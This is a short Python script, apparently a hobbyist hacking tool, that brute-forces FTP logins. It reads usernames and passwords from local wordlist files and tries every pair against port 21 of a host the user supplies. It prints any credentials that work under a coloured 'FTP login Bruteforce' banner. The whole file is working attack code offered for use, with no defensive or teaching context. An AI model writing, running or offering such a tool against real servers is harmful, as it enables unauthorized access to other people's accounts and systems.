import ftplib
import socket
import pyfiglet, termcolor

port = 21

def banner():
    ascii_banner = pyfiglet.figlet_format("FTP login Bruteforce", font='slant')
    print(termcolor.colored("#"*70,'red'))
    print(termcolor.colored(ascii_banner,'red'))
    print(termcolor.colored("#"*70,'red'))


def ftp_login(host, uname, passwd):
    server = ftplib.FTP()
    try:
        server.connect(host, port, timeout=5)
        server.login(uname,passwd)

    except ftplib.error_perm:
        result = "[-]Failed to connect using " + uname + " " + passwd
        print(termcolor.colored(result, 'red'))

    else:
        print(termcolor.colored("[+] Found credentials : ", 'yellow'),uname, passwd)
        return True

if __name__ == '__main__':

    banner()
    print(termcolor.colored("\n>>Enter the host name or address :", 'blue'), end=' ')
    hostname = input()
    host = socket.gethostbyname(hostname)
    uname = open("Files/user.txt").read().split("\n")
    passwords = open("Files/pass.txt").read().split("\n")

    for user in uname:
        for passwd in passwords:
            #tryd = "Trying " + user +" " +passwd
            #print(termcolor.colored(tryd, 'blue'))
            if ftp_login(host, user, passwd):
                statement = ">>Password has been found for the username : " + user
                print(termcolor.colored(statement, 'green'), "\n")
                break
   